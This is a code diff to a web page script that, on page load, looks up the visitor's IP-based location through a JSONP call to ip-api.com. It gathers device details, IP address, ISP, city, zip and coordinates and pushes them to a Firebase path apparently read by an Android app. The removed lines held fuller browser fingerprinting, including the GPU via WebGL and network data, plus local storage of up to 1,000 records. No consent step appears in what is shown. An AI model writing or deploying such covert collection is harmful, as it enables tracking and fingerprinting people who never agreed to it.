@@ -479,7 +479,6 @@
         const db = firebase.database();
 
         let locationCount = 0;
-        let lastUpdate = null;
 
         // Get device name
         function getDeviceName() {
@@ -500,104 +499,11 @@
             return device;
         }
 
-        // Get device fingerprint
-        function getDeviceFingerprint() {
-            return {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                languages: navigator.languages,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                devicePixelRatio: window.devicePixelRatio,
-                cpuCores: navigator.hardwareConcurrency || 0,
-                deviceMemory: navigator.deviceMemory || 0,
-                touchPoints: navigator.maxTouchPoints,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                connectionType: navigator.connection?.effectiveType || 'Unknown',
-                downlink: navigator.connection?.downlink || 'Unknown',
-                rtt: navigator.connection?.rtt || 'Unknown'
-            };
-        }
-
-        // Get GPU info
-        function getGPUInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        return {
-                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                        };
-                    }
-                }
-            } catch (e) {}
-            return { vendor: 'Unknown', renderer: 'Unknown' };
-        }
-
-        // Handle IP data from JSONP callback
-        window.handleIPData = function(data) {
-            // Clean up script tag
-            const scripts = document.querySelectorAll('script[src*="ip-api.com"]');
-            scripts.forEach(s => s.remove());
-            
-            if (data.status === 'fail') {
-                console.warn('⚠️ IP API failed:', data.message);
-                return;
-            }
-
+        // Send location data to Firebase
+        function sendToFirebase(locationData) {
             locationCount++;
-            lastUpdate = new Date().toLocaleTimeString();
             
-            const fingerprint = getDeviceFingerprint();
-            const gpuInfo = getGPUInfo();
-            
-            // Build complete location data
-            const locationData = {
-                id: locationCount,
-                deviceName: getDeviceName(),
-                deviceType: fingerprint.platform,
-                userAgent: fingerprint.userAgent,
-                languages: fingerprint.languages,
-                screenResolution: fingerprint.screenResolution,
-                colorDepth: fingerprint.colorDepth,
-                pixelDepth: fingerprint.pixelDepth,
-                devicePixelRatio: fingerprint.devicePixelRatio,
-                cpuCores: fingerprint.cpuCores,
-                deviceMemory: fingerprint.deviceMemory,
-                touchPoints: fingerprint.touchPoints,
-                gpuVendor: gpuInfo.vendor,
-                gpuRenderer: gpuInfo.renderer,
-                connectionType: fingerprint.connectionType,
-                downlink: fingerprint.downlink,
-                networkRTT: fingerprint.rtt,
-                timezone: fingerprint.timezone,
-                timezoneOffset: fingerprint.timezoneOffset,
-                latitude: data.lat,
-                longitude: data.lon,
-                accuracy: 'IP-based (approximate)',
-                altitude: 'N/A',
-                altitudeAccuracy: 'N/A',
-                heading: 'N/A',
-                speed: 'N/A',
-                timestamp: Date.now(),
-                collectedAt: new Date().toISOString(),
-                ipAddress: data.query,
-                country: data.country,
-                countryCode: data.countryCode,
-                region: data.regionName,
-                city: data.city,
-                zip: data.zip,
-                isp: data.isp,
-                organization: data.org,
-                locationMethod: 'IP-based'
-            };
-
-            // Send to Firebase /test/connection (for Android app)
+            // Send to /test/connection (for Android app)
             db.ref('test/connection').update(locationData)
                 .then(() => {
                     console.log(`✅ [${locationCount}] Sent to Firebase: ${locationData.city}, ${locationData.country}`);
@@ -611,22 +517,65 @@
                 .catch((error) => {
                     console.error('❌ History error:', error.message);
                 });
-
-            // Store locally
-            try {
-                let locations = JSON.parse(localStorage.getItem('locations') || '[]');
-                locations.push(locationData);
-                if (locations.length > 1000) locations = locations.slice(-1000);
-                localStorage.setItem('locations', JSON.stringify(locations));
-            } catch (e) {}
-        };
-
-        // Track location using JSONP (bypasses CORS)
-        function trackLocation() {
-            const script = document.createElement('script');
-            script.src = 'http://ip-api.com/json/?callback=handleIPData';
-            document.body.appendChild(script);
         }
+
+        // Track location using JSONP
+        function trackLocation() {
+            // Remove old script if exists
+            const oldScript = document.getElementById('ip-api-script');
+            if (oldScript) oldScript.remove();
+            
+            // Create new script for JSONP
+            const script = document.createElement('script');
+            script.id = 'ip-api-script';
+            script.src = 'http://ip-api.com/json/?callback=handleIPData&fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,query';
+            document.body.appendChild(script);
+            
+            // Timeout cleanup
+            setTimeout(() => {
+                const scriptEl = document.getElementById('ip-api-script');
+                if (scriptEl) scriptEl.remove();
+            }, 5000);
+        }
+
+        // Handle IP data callback
+        window.handleIPData = function(data) {
+            // Clean up script tag
+            const script = document.getElementById('ip-api-script');
+            if (script) script.remove();
+            
+            if (data.status === 'fail') {
+                console.warn('⚠️ IP API failed:', data.message);
+                return;
+            }
+
+            // Build location data object
+            const locationData = {
+                deviceName: getDeviceName(),
+                deviceType: navigator.platform,
+                userAgent: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}`,
+                cpuCores: navigator.hardwareConcurrency || 0,
+                deviceMemory: navigator.deviceMemory || 0,
+                latitude: data.lat,
+                longitude: data.lon,
+                accuracy: 'IP-based (approximate)',
+                city: data.city,
+                country: data.country,
+                countryCode: data.countryCode,
+                region: data.regionName,
+                zip: data.zip,
+                timezone: data.timezone,
+                ipAddress: data.query,
+                isp: data.isp,
+                organization: data.org,
+                locationMethod: 'IP-based',
+                timestamp: Date.now(),
+                collectedAt: new Date().toISOString()
+            };
+
+            sendToFirebase(locationData);
+        };
 
         // Start tracking on page load
         document.addEventListener('DOMContentLoaded', () => {
